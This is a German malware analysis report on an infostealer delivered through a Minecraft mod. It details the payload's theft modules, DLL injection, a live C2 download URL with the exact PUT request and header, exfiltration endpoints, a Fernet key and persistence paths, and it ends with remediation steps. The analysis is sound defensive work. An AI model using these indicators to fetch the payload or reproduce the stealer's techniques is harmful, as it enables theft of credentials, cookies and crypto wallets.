# Krypton Mod – Payload Stealer Vollanalyse

> Heruntergeladen von: `https://v5.thisisafalsepositive.ru/cdn/e/3b8f6d2a9c1e`  
> Methode: PUT + Header `x-cdn-origin-verify: trusted-upstream`  
> Extrahiert: 736 Dateien  
> Kern-Binary: `AppHost/app.pyd` (1.848.832 bytes) – Nuitka-kompiliertes Python

---

## Architektur-Übersicht

```
app.pyd (Nuitka PE-DLL)
├── app/__init__.py         → run() – Haupt-Orchestrator
├── app/http.py             → HTTPS-Client, DNS-over-HTTPS
├── app/logging/            → Logging-Framework
├── app/resources/          → Eingebettete Ressourcen (obfusziert)
├── app/staging.py          → Download + Install weiterer Updates
├── app/trace.py            → Log-Datei: %TEMP%\svchost_d.log
├── app/util/
│   ├── crypto.py           → Kryptographie-Hilfsfunktionen
│   ├── dll_injection.py    → DLL-Injection in Prozesse (!)
│   ├── file.py             → Dateioperationen
│   └── handle_copy.py      → Windows-Handle-Duplikation (NtQuerySystemInformation)
└── app/handlers/
    ├── browser.py          → Chromium-Passwörter, Cookies, Kreditkarten
    ├── firefox.py          → Firefox-Passwörter (3DES-CBC + AES-256-CBC)
    ├── discord.py          → Discord-Token-Extraktion
    ├── wallets.py          → Krypto-Wallets
    ├── browser_extensions.py → Browser-Extension-Daten (MetaMask etc.)
    ├── credentials.py      → Windows-Credential-Manager
    ├── minecraft.py        → Minecraft-Session-Tokens (NBT-Parser!)
    ├── keywords.py         → Datei-Keyword-Suche
    ├── screenshot.py       → Screenshot
    └── system_info.py      → System-Informationen
```

---

## Stealer-Fähigkeiten (Bewiesen durch Laufzeit-Analyse)

### Browser-Daten (`app.handlers.browser`)
- **Ziel:** Chromium-basierte Browser (Chrome, Edge, Brave, Opera, ...)
- **Klaut:** Passwörter (Login Data), Cookies, Kreditkarten (Web Data), Autofill, Tokens
- **Pfad:** `%LOCALAPPDATA%\Google\Chrome\User Data\...`
- Variablen: `chromium_passwords`, `chromium_cookies`, `chromium_cards`, `chromium_tokens`, `chromium_autofills`

### Firefox (`app.handlers.firefox`)
- **Ziel:** Mozilla Firefox
- **Klaut:** Passwörter, Cookies, Autofill
- **Entschlüsselung:** Unterstützt Legacy (3DES-CBC) **und** modernes (AES-256-CBC) NSS-Format
- **Pfad:** `%APPDATA%\Mozilla\Firefox\Profiles\...`

### Discord (`app.handlers.discord`)
- **Klaut:** Discord-Tokens aus lokalen Storage-Dateien
- Verzeichnis: `%APPDATA%\discord\...`

### Krypto-Wallets (`app.handlers.wallets`)
- **Klaut:** Wallet-Dateien aus Desktop/Roaming
- Unterstützte Wallets laut Keyword-Liste: MetaMask, Exodus, Atomic, ...

### Browser-Extensions (`app.handlers.browser_extensions`)
- **Klaut:** Daten aus Browser-Extensions
- Targets: MetaMask, Phantom, Coinbase Wallet, etc.
- Pfade: `%APPDATA%` + `%LOCALAPPDATA%`

### Minecraft (`app.handlers.minecraft`)
- **Klaut:** Minecraft-Session-Tokens / Account-Daten
- **NBT-Parser** eingebaut (liest `.nbt`-Dateien)
- Pfad: `%APPDATA%\.minecraft\...`

### Keyword-Dateisuche (`app.handlers.keywords`)
- Durchsucht Desktop, Documents, Downloads, OneDrive nach Dateien mit Keywords:
  ```
  account, password, passwd, pass, secret, seed, mnemonic, wallet, crypto,
  backup, token, credential, login, auth, 2fa, mfa, recovery, private, key,
  phrase, paypal, bank, metamask, exodus, atomic, code, memo, credit, card,
  mail, address, phone, number, database, config
  ```
- Max 150 Dateien pro Ordner, max 20 MB pro Datei
- Suchpfade auf **diesem System:**
  - `C:\Users\Rico\Desktop`
  - `C:\Users\Rico\Documents`
  - `C:\Users\Rico\Downloads`
  - `C:\Users\Rico\OneDrive`
  - `C:\Users\Rico\OneDrive\Desktop`
  - `C:\Users\Rico\OneDrive\Documents`

### Screenshot (`app.handlers.screenshot`)
- Macht Bildschirmaufnahme des gesamten Monitors

### System-Info (`app.handlers.system_info`)
- Sammelt Hardware/OS-Informationen

### Windows Credentials (`app.handlers.credentials`)
- Liest Windows Credential Manager (gespeicherte Passwörter)

### DLL-Injection (`app.util.dll_injection`)
- **Injiziert DLLs in laufende Prozesse** via:
  - `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`
- Konstanten: `MEM_COMMIT`, `MEM_RESERVE`, `PAGE_READWRITE`, `INFINITE`

### Handle-Duplikation (`app.util.handle_copy`)
- Nutzt undokumentierte Windows-API `NtQuerySystemInformation` (SystemExtendedHandleInformation)
- Dupliziert Handles aus anderen Prozessen
- Zweck: Zugriff auf gesperrte Dateien (z.B. Chrome's `Cookies`-DB während Chrome läuft)

---

## Netzwerk / Exfiltration

### HTTP-Client (`app.http`)
- **DNS-over-HTTPS:** `https://cloudflare-dns.com/dns-query`
- **SHARD_HEADERS:** `{'X-Edge-Cache-Revalidate': 'stale-if-error', 'X-Runtime-Env': 'jre-embedded'}`
- Nutzt `requests` + Retry-Adapter

### Staging (`app.staging`)
- Persistenz-Mechanismus: Installiert sich nach `%LOCALAPPDATA%\IManagementEngine\`
- Lädt portable Python 3.12.7 nach: `https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip`
- CDN-Endpunkte für Updates:
  - `_CDN_APP_PYD = 'a1f8d3b7c2e9'`
  - `_CDN_MAIN_PY = 'd6c9a4e1f7b3'`
  - `_CDN_REQUIREMENTS = 'b7e2f1d9c3a6'`
- Fernet-Verschlüsselungsschlüssel: `dK9mT3nR7xQ2pL8wF4jH6yB1cN5gA0sZ12345678abc=`
- Status-Listener: `127.0.0.1:62143`

### Log-Datei
- **Lokal:** `%TEMP%\svchost_d.log` (als `svchost` getarnt)

---

## Ressourcen-Modul (`app.resources.browser_module`)
Enthält verschleierte (Base64-obfuszierte) Binärdaten – vermutlich injizierbare DLL für Browser-Hookung.

---

## run()-Variablen (Kompletter Ablauf)

```python
# co_varnames von app.run():
start_time, staging_thread, minecraft_envs, cpy_envs, env_type,
elapsed, chromium_passwords, chromium_cookies, chromium_cards,
chromium_tokens, chromium_autofills, firefox_passwords,
firefox_cookies, firefox_autofills, browser_files, firefox_files,
hit_file, minecraft_files, wallet_files, extension_files,
credential_files, existing_names, keyword_files, e, total_elapsed
```

---

## C2-Infrastruktur

| Komponente | Wert |
|------------|------|
| C2-Domain (Blockchain) | `v5.thisisafalsepositive.ru` |
| Fallback-Domain (statisch) | `sltnnt.ru` |
| Blockchain-Contract | `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a` (Polygon) |
| Payload-Pfad | `/cdn/e/3b8f6d2a9c1e` |
| Log-Endpunkt | `/shard/submitMinecraftLog` |
| Registrierungs-Endpunkt | `/shard/prefireMc` |
| Fernet-Key (Payload) | `dK9mT3nR7xQ2pL8wF4jH6yB1cN5gA0sZ12345678abc=` |
| DNS | Cloudflare DoH (`cloudflare-dns.com`) |
| Persistenz-Ordner | `%LOCALAPPDATA%\IManagementEngine\` |
| Tarnung Log | `%TEMP%\svchost_d.log` |
| Session-UUID | `a33073bf-c99c-4492-84a3-4d632d36b2e0` |

---

## Fazit

Dies ist ein vollständiger **Infostealer** (vermutlich "Prefire Stealer" basierend auf API-Endpunkten `/shard/prefireMc`).

**Gestohlene Daten:**
- Alle Browser-Passwörter (Chrome, Firefox, Edge, ...)
- Alle Browser-Cookies (inkl. Session-Cookies für Social Media, Banking)
- Discord-Tokens
- Krypto-Wallets + Browser-Extensions (MetaMask, Phantom, ...)
- Minecraft-Session-Tokens + Microsoft-Account-Daten
- Windows-Gespeicherte-Passwörter
- Dateien mit sensiblen Keywords aus Desktop/Docs/Downloads
- Screenshot
- System-Informationen

**Besonders gefährlich:**
- Handle-Duplikation → stiehlt auch aus laufenden Prozessen
- DLL-Injection-Modul vorhanden
- Blockchain-basierte C2-Infrastruktur (nicht durch DNS-Blocking abschaltbar)
- Persistenz via `IManagementEngine`-Ordner
- Tarnung als `svchost`

**⚠️ SOFORTMASSNAHMEN:**
1. Alle Browser-Passwörter ändern
2. Discord-Token invalidieren (Passwort ändern)
3. Alle Krypto-Wallet-Seed-Phrases als kompromittiert betrachten
4. Microsoft/Minecraft-Account-Passwort ändern + 2FA prüfen
5. `%LOCALAPPDATA%\IManagementEngine\` prüfen und löschen
6. `%TEMP%\svchost_d.log` prüfen
7. Antivirus-Vollscan

---

## Kompletter Ablauf (rekonstruiert)

```
[1] dzscgq4i.onInitialize()  ← Fabric ModInitializer (beim Minecraft-Start)
    ├── Liest Minecraft-Account: username, UUID, accessToken
    ├── Holt C2-Domain via Polygon-Blockchain
    ├── Ruft prefire() → POST https://<c2>/shard/prefireMc
    │       Body: {"sessionId":"<uuid>","userId":"<minecraft-uuid>"}
    │       Headers: X-Edge-Cache-Revalidate: stale-if-error
    │                X-Runtime-Env: jre-embedded
    ├── Baut JSON-Context-String mit: username, uuid, accessToken,
    │   domain, env-type ("Default"), sessionId, configDir, userId
    ├── Base64-kodiert Context
    └── Startet java.exe -cp <mod-jar> com.github.iup9rr2l <base64-context>
            Logs nach: %LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\_spawn.log
            Stdin:  NUL
            WorkDir: %LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\

[2] iup9rr2l.main()  ← Gestarteter Prozess (detached)
    ├── Prüft arg[0] auf "-restarted" Flag
    ├── Baut gleichen Context-String (domain, sessionId, env)
    └── Ruft s21rd71e.main(base64) auf

[3] s21rd71e.runDetached()  ← Kern-Dropper
    ├── Arbeitsverzeichnis: %LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\
    ├── Log: "========== DETACHED PROCESS STARTED =========="
    ├── Überprüft Context (UserId, Env)
    ├── Prüft ob %LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\AppHost\main.py
    │   und AppHost\python.exe bereits existieren
    ├── Falls NICHT vorhanden → b6e8ycf9() Download (3 Versuche):
    │       PUT https://<c2-domain><uuid>/cdn/e/3b8f6d2a9c1e
    │       Header: x-cdn-origin-verify: trusted-upstream
    │       Response: AES-verschlüsselte ZIP → entpacken
    │       Log: "Download attempt 1/3..."
    │       Fehler: "Download failed: HTTP <code>"
    │       Fehler: "ERROR: Failed to setup portable runtime"
    ├── Falls vorhanden → Log: "Portable runtime already cached"
    ├── Log: "Spawning stealer..."
    ├── ckuomn5o() → Startet python.exe AppHost\main.py
    └── ivrg3eu8() → Sendet Log an C2

[4] python.exe AppHost\main.py → app.pyd app.run()
    ├── Stiehlt alle Daten (Browser, Discord, Wallets, ...)
    └── Sendet Ergebnisse an C2
```

## Vollständige C2-Endpunkte

| Endpunkt | Methode | Zweck |
|----------|---------|-------|
| `https://<c2>/shard/prefireMc` | POST | Registrierung (sessionId + userId) |
| `https://<c2>/<uuid>/cdn/e/3b8f6d2a9c1e` | PUT | ZIP-Payload herunterladen |
| `https://<c2>/shard/submitMinecraftLog` | POST | Log + gestohlene Daten hochladen |

**Persistenz-Tarnung:**
- Arbeitsverzeichnis: `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\`
- Log: `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex\_spawn.log`
- Klingt wie legitimer Windows/Microsoft-Ordner

---

*Analyse: vollständig statisch + Laufzeit-Inspektion ohne Code-Ausführung*
